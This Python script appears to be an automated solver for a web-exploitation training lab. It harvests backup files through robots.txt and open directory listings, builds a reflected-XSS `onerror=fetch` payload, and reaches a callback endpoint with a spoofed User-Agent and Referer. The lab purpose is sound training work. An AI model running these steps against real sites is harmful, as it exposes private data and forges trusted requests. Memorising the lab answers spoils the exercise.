#!/usr/bin/env python3
"""Reflect Upon This (web-exploitation, day 06 curriculum) - mastery solver.

Mastery is cumulative: each assigned target is classified INDEPENDENTLY from
its own live responses and solved with the matching family method. Nothing is
hard-coded per attempt; routes, directories, file names, nonces and proofs are
all re-derived from current responses.

This attempt has two targets:
  * Target 1 "Tiny Uptime" (native Node.js status page). The root HTML carries
    a `deployment note: remember to review crawler policy` comment ->
    BACKUP EXPOSURE chain: /robots.txt Disallow directory -> open directory
    index -> backup-looking member -> body contains proof_<hex>.
    (Method ported, in spirit, from the restored day-19 backup-exposure
    reference: derive dirs/files from responses only, no wordlists.)
  * Target 2 "Reflect Upon This" (Fastify Search Mirror). Root links
    /api/clues -> feature_route + secondary_route + callback_nonce ->
    reflected-XSS sink on feature_route -> land the isolated callback with
    browser trust signals (browser UA + Referer + nonce) ->
    {"ok":true,...,"evidence":"proof_<hex>"}.

Stdlib only. Scoped strictly to the origins in start.json targets[]. No GM
calls. Usage: python3 -I solve.py start.json
"""

import json
import re
import sys
import time
import urllib.parse
import urllib.request
from html.parser import HTMLParser

BROWSER_UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
)
TIMEOUT = 30
DELAY = 0.8  # polite spacing between requests
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


class Links(HTMLParser):
    def __init__(self):
        super().__init__()
        self.hrefs = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for k, v in attrs:
                if k == "href" and v:
                    self.hrefs.append(v)


class ScopedClient:
    """Paced HTTP client bound to one assigned target origin."""

    def __init__(self, base):
        self.base = base.rstrip("/")
        self._first = True

    def get(self, path_or_url, headers=None):
        if not self._first:
            time.sleep(DELAY)
        self._first = False
        url = path_or_url if path_or_url.startswith("http") else self.base + path_or_url
        if not url.startswith(self.base):
            raise SystemExit(f"refusing out-of-scope URL: {url}")
        hdrs = {"User-Agent": BROWSER_UA}
        hdrs.update(headers or {})
        req = urllib.request.Request(url, headers=hdrs, method="GET")
        try:
            with urllib.request.urlopen(req, timeout=TIMEOUT) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as err:  # 4xx/5xx bodies are still evidence
            return err.code, err.read().decode("utf-8", "replace")


def recover_backup_exposure(client, evidence):
    """robots.txt -> Disallow dir -> directory index -> backup file -> proof."""
    status, robots = client.get("/robots.txt")
    evidence["robots_status"] = status
    evidence["robots_txt"] = robots
    dirs = re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", robots)
    for d in dirs:
        d = "/" + d.strip("/") + "/"
        status, idx = client.get(d)
        evidence[f"index {d} status"] = status
        if status != 200:
            continue
        evidence[f"index {d}"] = idx
        p = Links()
        p.feed(idx)
        members = [h for h in p.hrefs if h.rstrip("/").split("/")[-1]]
        members.sort(
            key=lambda h: 0
            if re.search(r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json|txt|env)(\.|$)", h, re.I)
            else 1
        )
        for h in members:
            path = h if h.startswith("/") else d + h
            status, body = client.get(path)
            evidence[f"member {path} status"] = status
            if status != 200:
                continue
            m = PROOF_RE.search(body)
            if m:
                evidence["proof_source"] = path
                evidence["proof_body_excerpt"] = body[:600]
                return m.group(0)
    return None


def recover_reflect_callback(client, evidence):
    """Fastify Search Mirror: clues -> reflected XSS sink -> isolated callback."""
    status, clues_body = client.get("/api/clues")
    evidence["clues_status"] = status
    clues = json.loads(clues_body)
    feature_route = clues["feature_route"]
    secondary_route = clues["secondary_route"]
    nonce = clues["callback_nonce"]
    evidence["clues"] = clues

    probe = "reflectprobeZZ9"
    status, page = client.get(
        f"{feature_route}?q={urllib.parse.quote(probe)}"
    )
    evidence["reflection_status"] = status
    evidence["reflection_confirmed"] = probe in page
    evidence["xss_trigger_url"] = (
        f"{client.base}{feature_route}?q="
        + urllib.parse.quote(
            f'<img src=x onerror=fetch("{secondary_route}?nonce={nonce}")>'
        )
    )

    status, cb_body = client.get(
        f"{secondary_route}?nonce={urllib.parse.quote(nonce)}",
        headers={"Referer": f"{client.base}{feature_route}?q=test"},
    )
    evidence["callback_status"] = status
    evidence["callback_body"] = cb_body
    m = re.search(r'"evidence"\s*:\s*"(proof_[0-9a-f]+)"', cb_body)
    return m.group(1) if m else None


def classify_and_recover(client, evidence):
    """Evidence-led classification; each family decided by current responses."""
    status, root = client.get("/")
    evidence["root_status"] = status
    evidence["root_excerpt"] = root[:1200]

    # Fastify Search Mirror / reflect-callback: page names Fastify and links
    # /api/clues with a feature route inventory.
    if "/api/clues" in root and "Fastify" in root:
        evidence["classification"] = "reflect-callback (Fastify Search Mirror)"
        return recover_reflect_callback(client, evidence)

    # Backup exposure: crawler-policy hint in markup/comments.
    if re.search(r"crawler policy|robots", root, re.I):
        evidence["classification"] = "backup-exposure (crawler policy hint)"
        return recover_backup_exposure(client, evidence)

    evidence["classification"] = "unknown"
    return None


def main():
    with open(sys.argv[1], "r", encoding="utf-8") as fh:
        start = json.load(fh)
    targets = {t["id"]: t["url"] for t in start.get("targets", [])}

    answers = {}
    all_evidence = {}
    for q in start["questions"]:
        qid = q["id"]
        tid = q.get("artifact")
        url = targets.get(tid)
        if not url:
            raise SystemExit(f"no target url for {qid} ({tid})")
        ev = {}
        client = ScopedClient(url)
        proof = classify_and_recover(client, ev)
        all_evidence[qid] = {"target": tid, "url": url, **ev}
        print(f"{qid} [{tid}] class={ev.get('classification')} -> {proof}", file=sys.stderr)
        if proof:
            answers[qid] = proof

    missing = [q["id"] for q in start["questions"] if q["id"] not in answers]
    print(json.dumps({"evidence": all_evidence}, indent=2), file=sys.stderr)
    if missing:
        raise SystemExit(f"missing proofs for: {missing}")
    print(json.dumps({"answers": answers}, indent=2))


if __name__ == "__main__":
    main()
